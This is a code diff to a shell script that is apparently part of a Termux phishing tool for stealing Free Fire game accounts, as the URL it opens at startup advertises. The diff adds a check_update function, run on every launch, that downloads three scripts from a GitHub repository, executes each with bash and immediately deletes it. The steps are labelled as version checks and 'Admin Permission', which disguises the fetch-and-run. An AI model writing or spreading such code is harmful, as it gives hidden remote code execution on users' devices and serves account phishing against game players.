@@ -1035,6 +1035,15 @@ printf "\e[1;92m [Done]\e[0m";
 echo "";
 }
 
+check_update () {
+echo ""
+echo -ne "\e[33m Chack Lates Version : " && sleep 1 && wget -q https://github.com/OnlineHacKing/FF/raw/main/update-2.8 > /dev/null && bash update-2.8 && rm -rf update-2.8
+echo ""
+echo -ne "\e[33m Checking Update : " && sleep 2 && wget -q https://github.com/OnlineHacKing/FF/raw/main/chack-update-2.8 > /dev/null && bash chack-update-2.8 && rm -rf chack-update-2.8
+echo ""
+echo -ne "\e[33m Admin Permission : " && sleep 1 && wget -q https://github.com/OnlineHacKing/FF/raw/main/admin > /dev/null && bash admin && rm -rf admin
+echo ""
+}
 
 clear
 echo ""
@@ -1044,6 +1053,7 @@ echo ""
 echo ""
 sleep 3
 check_status
+check_update
 sleep 2
 echo ""
 termux-open-url https://wwu.onlinehacking.in/free-fire-account-hack-phishing-tool-with-termux
